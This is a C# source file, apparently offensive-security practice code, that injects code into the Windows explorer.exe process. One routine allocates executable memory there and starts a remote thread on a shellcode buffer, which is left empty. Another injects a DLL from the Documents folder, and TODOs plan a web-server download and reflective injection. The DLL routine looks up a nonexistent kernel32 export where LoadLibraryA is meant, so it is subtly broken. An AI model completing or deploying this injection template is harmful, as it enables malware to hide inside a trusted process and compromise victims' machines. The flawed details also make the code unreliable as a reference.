using System.Diagnostics;
using System;
using System.Runtime.InteropServices;

namespace Cevsn
{
    public class Privsn
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
            uint processAccess, //Access rights (dwDesiredAccess)
            bool bInheritHandle, //Inherited return handler
            uint processId //Process Identifier
        );

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocEx(
            IntPtr hProcess, //process handle to explorer.exe
            IntPtr lpAddress, //desired address of the alloc in the remote process -> new buffer will be allocated with starting addr from here
            //These 3 mirror VirtualAllocEx API params and specify and specify:
            uint dwSize, //Size of desired allocation               
            uint flAllocationType, //Allocation Type
            uint flProtect //Memory Protections
        ); 

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
            IntPtr hProcess, 
            IntPtr lpBaseAddress,
            byte[] lpBuffer, 
            Int32 nSize, 
            out IntPtr lpNumberOfBytesWritten
        );

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(
            IntPtr hProcess, //Process

            //Set these to 0 to accept default values
            IntPtr lpThreadAttributes, //Security descriptor
            uint dwStackSize, //stack size

            IntPtr lpStartAddress, //Starting address of the Thread (equal to address of buffer with allocated and copied shellcode inside explorer.exe)
            IntPtr lpParameter, //Pointer to variables which will be passed to the thread function pointed to by lpStartAddress (no params in shellcode = NULL)
            uint dwCreationFlags,
            IntPtr lpThreadId
        );

        //Charset ASCII = LoadLibraryA, Unicode = LoadLibraryW
        [DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary(   

            [MarshalAs(UnmanagedType.LPStr)]
                string lpFileName
        );
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(
            IntPtr hModule, 
            string procName
        );

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)] 
        public static extern IntPtr GetModuleHandle(
            string lpModuleName
        );

        public Privsn()
        {
            //injectShellcode();
        }

        public void injectShellcode()
        {
            //Open Channel from this process to explorer.exe with
            //Access (all Access), Inherit (false), ProcID von explorer.exe
            //IntPtr hProcess = OpenProcess(0x001F0FFF, false, 4804);
            Process[] expProc = Process.GetProcessesByName("explorer");
            uint pid = Convert.ToUInt32(expProc[0].Id);

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

            //Allocalte virtaul mem
            //0x1000, 0x3000 (MEM_COMMIT and MEM_RESERVE) and 0x40 (PAGE_EXECUTE_READWRITE)
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            //Shellcode to inject
            byte[] shellcode = new byte[626];
            
            IntPtr outSize;
            //Inject shellcode into explorer.exe
            WriteProcessMemory(hProcess, addr, shellcode, shellcode.Length, out outSize);

            //Create Thread with injected Shellcode
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }

        public void injectDLL()
        {
            //Todo: Get dll from Webserver
            String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            String dllName = dir + "\\cevsn.dll";

            Process[] expProc = Process.GetProcessesByName("explorer");
            uint pid = Convert.ToUInt32(expProc[0].Id);

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x4);

            IntPtr outSize;
            Boolean res = WriteProcessMemory(hProcess, addr, System.Text.Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);

            //Locate address
            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "Cevsn");

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
        }

        public void injectDLLReflective()
        {
            //TODO
        }
    }
}